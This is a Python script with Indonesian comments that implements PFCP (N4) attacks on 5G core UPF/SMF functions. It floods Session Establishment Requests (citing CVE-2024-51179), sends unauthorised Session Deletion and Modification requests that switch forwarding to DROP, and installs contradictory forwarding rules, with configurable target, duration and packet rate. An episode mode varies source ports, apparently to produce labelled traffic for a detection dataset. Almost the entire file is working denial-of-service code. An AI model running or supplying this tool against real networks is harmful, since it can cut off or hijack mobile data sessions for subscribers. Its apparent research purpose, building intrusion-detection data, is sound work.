#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tier 2 — Serangan PFCP (N4) ke UPF/SMF.
Model: Amponis et al., "Threatening the 5G core via PFCP DoS attacks" (EURASIP JWCN 2022).

Mode:
  estab_flood  T2-03  banjir PFCP Session Establishment Request (CVE-2024-51179)
  delete       T2-01  Unauthorised PFCP Session Deletion Request
  modify       T2-02  Unauthorised PFCP Session Modification Request
  misconfig    T2-04  Session Establishment dgn PDR/FAR cacat (rule misconfig)

  python3 pfcp_attack.py <mode> <target_ip> [durasi] [pps]
Contoh: python3 pfcp_attack.py estab_flood 172.23.0.30 15 500

Mode EPISODE (revisi R2, multi-class) via env var — tiap "session" memakai
UDP SOURCE PORT efemeral berbeda → 5-tuple kanonik berbeda → DIHITUNG sebagai
flow independen oleh audit. Dipakai batch_small.sh untuk memperbanyak sampel:
  SESSIONS=<n>            jumlah flow independen (source port acak) dlm 1 run
  PKTS_PER_SESSION=<k>    paket per flow (default 6)
  SPORT_LO/SPORT_HI       rentang port efemeral (default 20000..60000)
Default (SESSIONS kosong) = perilaku lama (sport=8805, 1 flow) agar tier2 tetap reproducible.
"""
import sys, time, os, random
from scapy.all import IP, UDP, send, Raw
from scapy.contrib.pfcp import (PFCP, PFCPSessionEstablishmentRequest,
                                PFCPSessionDeletionRequest, PFCPSessionModificationRequest,
                                IE_NodeId, IE_FSEID, IE_CreatePDR, IE_PDR_Id, IE_Precedence,
                                IE_CreateFAR, IE_FAR_Id, IE_ApplyAction)
PFCP_PORT = 8805

def node_id(ip):
    return IE_NodeId(id_type=0, ipv4=ip)

def p_estab(target, src, seq, seid, sport, prec=100):
    # Session Establishment Request dgn F-SEID + 1 PDR + 1 FAR minimal
    ie = [ node_id(src),
           IE_FSEID(v4=1, seid=seid, ipv4=src),
           IE_CreatePDR(IE_list=[IE_PDR_Id(id=1), IE_Precedence(precedence=prec)]),
           IE_CreateFAR(IE_list=[IE_FAR_Id(id=1), IE_ApplyAction(FORW=1)]) ]
    return (IP(dst=target)/UDP(sport=sport, dport=PFCP_PORT)/
            PFCP(version=1, S=1, seid=0, seq=seq)/PFCPSessionEstablishmentRequest(IE_list=ie))

def p_delete(target, src, seq, seid, sport, prec=0):
    return (IP(dst=target)/UDP(sport=sport, dport=PFCP_PORT)/
            PFCP(version=1, S=1, seid=seid, seq=seq)/PFCPSessionDeletionRequest())

def p_modify(target, src, seq, seid, sport, prec=0):
    return (IP(dst=target)/UDP(sport=sport, dport=PFCP_PORT)/
            PFCP(version=1, S=1, seid=seid, seq=seq)/
            PFCPSessionModificationRequest(IE_list=[IE_CreateFAR(IE_list=[IE_FAR_Id(id=2), IE_ApplyAction(DROP=1)])]))

def p_misconfig(target, src, seq, seid, sport, prec=0):
    # Establishment dgn FAR DROP + precedence aneh → aturan forwarding salah
    ie = [ node_id(src), IE_FSEID(v4=1, seid=seid, ipv4=src),
           IE_CreatePDR(IE_list=[IE_PDR_Id(id=1), IE_Precedence(precedence=prec)]),
           IE_CreateFAR(IE_list=[IE_FAR_Id(id=1), IE_ApplyAction(DROP=1, FORW=1)]) ]  # kontradiktif
    return (IP(dst=target)/UDP(sport=sport, dport=PFCP_PORT)/
            PFCP(version=1, S=1, seid=0, seq=seq)/PFCPSessionEstablishmentRequest(IE_list=ie))

BUILD = {"estab_flood": p_estab, "delete": p_delete, "modify": p_modify, "misconfig": p_misconfig}

def run_episode_mode(fn, mode, target, src, sessions):
    """Tiap session = source port efemeral baru (flow independen) + jitter param."""
    pks = int(os.environ.get("PKTS_PER_SESSION", "6"))
    lo = int(os.environ.get("SPORT_LO", "20000")); hi = int(os.environ.get("SPORT_HI", "60000"))
    print(f"[PFCP/{mode}] EPISODE: {sessions} flow × {pks} pkt (sport {lo}-{hi}) → {target}:{PFCP_PORT} src={src}")
    seq = random.randint(1, 1000); sent = 0; ports = set()
    for _ in range(sessions):
        sport = random.randint(lo, hi)
        while sport in ports: sport = random.randint(lo, hi)   # pastikan port unik → flow unik
        ports.add(sport)
        prec = random.choice([0, 50, 100, 200, 255])           # variasi param antar-episode
        for _ in range(pks):
            seid = random.randint(1, 0xFFFFFFFF)
            send(fn(target, src, seq & 0xFFFFFF, seid, sport, prec), verbose=0)
            seq += 1; sent += 1
        time.sleep(random.uniform(0.01, 0.04))                 # jitter antar-flow
    print(f"[PFCP/{mode}] EPISODE selesai: {len(ports)} flow unik, {sent} pesan PFCP.")

def main():
    if len(sys.argv) < 3 or sys.argv[1] not in BUILD:
        print(__doc__); sys.exit(2)
    mode, target = sys.argv[1], sys.argv[2]
    src = os.environ.get("SRC_IP", "172.23.0.50")
    fn = BUILD[mode]
    sessions = int(os.environ.get("SESSIONS", "0"))
    if sessions > 0:
        run_episode_mode(fn, mode, target, src, sessions); return
    # --- perilaku lama (1 flow, sport=8805) ---
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 15
    pps = int(sys.argv[4]) if len(sys.argv) > 4 else 500
    interval = 1.0/pps if pps > 0 else 0
    print(f"[PFCP/{mode}] → {target}:{PFCP_PORT} src={src} {duration}s @ ~{pps}pps")
    end = time.time() + duration; seq = 1; sent = 0
    while time.time() < end:
        seid = random.randint(1, 0xFFFFFFFF)
        send(fn(target, src, seq & 0xFFFFFF, seid, PFCP_PORT), verbose=0)
        seq += 1; sent += 1
        if interval: time.sleep(interval)
    print(f"[PFCP/{mode}] selesai, {sent} pesan PFCP terkirim.")

if __name__ == "__main__":
    main()
